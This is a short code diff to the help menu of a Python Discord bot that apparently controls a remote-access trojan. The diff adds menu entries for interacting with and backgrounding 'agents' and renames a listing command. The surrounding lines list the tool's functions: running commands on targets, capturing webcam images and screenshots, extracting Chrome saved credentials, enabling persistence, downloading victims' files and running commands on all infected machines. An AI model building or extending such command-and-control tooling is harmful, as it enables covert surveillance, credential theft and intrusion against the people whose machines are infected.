@@ -359,6 +359,8 @@ async def keylog(ctx: commands.Context, mode:str ,interval:int):
 async def keylog(ctx: commands.Context):
     my_embed = discord.Embed(title=f"Help Menu", color=0x00FF00)
     my_embed.add_field(name="/help", value="Shows this menu", inline=False)
+    my_embed.add_field(name="/interact <id>", value="Interact with a specific agent", inline=False)
+    my_embed.add_field(name="/background", value="Background your current agent", inline=False)
     my_embed.add_field(name="/cmd <command>", value="Run command on target", inline=False)
     my_embed.add_field(name="/cd <path>", value="Change current directory", inline=False)
     my_embed.add_field(name="/webshot ", value="Grab a picture from the webcam", inline=False)
@@ -367,7 +369,7 @@ async def keylog(ctx: commands.Context):
     my_embed.add_field(name="/screenshot ", value="Grab a screenshot from the agent", inline=False)
     my_embed.add_field(name="/creds ", value="Get chrome saved credentials", inline=False)
     my_embed.add_field(name="/persistent ", value="Enable persistence", inline=False)
-    my_embed.add_field(name="/ls", value="Get a list of all active agents", inline=False)
+    my_embed.add_field(name="!ls", value="Get a list of all active agents", inline=False)
     my_embed.add_field(name="/download <path>", value="Download file from agent", inline=False)
     my_embed.add_field(name="/terminate ", value="Terminate the session ", inline=False)
     my_embed.add_field(name="/cmd-all <command>", value="Run a command on all agents", inline=False)
